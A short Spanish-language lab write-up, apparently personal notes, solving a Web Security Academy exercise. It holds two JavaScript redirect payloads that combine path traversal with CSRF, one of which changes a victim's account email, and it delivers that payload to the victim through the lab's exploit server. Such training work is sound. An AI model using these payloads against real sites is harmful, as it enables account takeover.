


payloads:

payload 1:
script
	document.location = "https://LAB-ID.net/post/comment/confirmation?postId=../my-account";
script

https://0a21003f034ef67d89ecae7c00870001.web-security-academy.net/

payload 2:
script
	document.location = "https://LAB-ID.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hackme2%40web-security-academy.net%26submit=1"
script

logeandome, actualizando correo y agregando un comment:

![[Pasted image 20230704185654.png]]


![[Pasted image 20230704185753.png]]

![[Pasted image 20230704185815.png]]

![[Pasted image 20230704185857.png]]

despues de poner el comentario me redirige al HOME y con esta direccion:

https://0a21003f034ef67d89ecae7c00870001.web-security-academy.net/post/3

probando si puedo redigir con el payload 1:

https://0a21003f034ef67d89ecae7c00870001.web-security-academy.net/post/comment/confirmation?postId=../my-account

efectivamente despues de poner este link me redirige aca:

![[Pasted image 20230704190506.png]]

probando el payload2 si puedo cambiar correo y redigir:

https://0a21003f034ef67d89ecae7c00870001.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hackme2%40web-security-academy.net%26submit=1

efectivamente pude cambiar el correo:

![[Pasted image 20230704190949.png]]

voy al exploit server y uso el segundo payload:

![[Pasted image 20230704191342.png]]

hago un cambio en el correo para rastrear que si se cumple el proceso:

![[Pasted image 20230704191508.png]]

store y deliver to the victim:

![[Pasted image 20230704191616.png]]
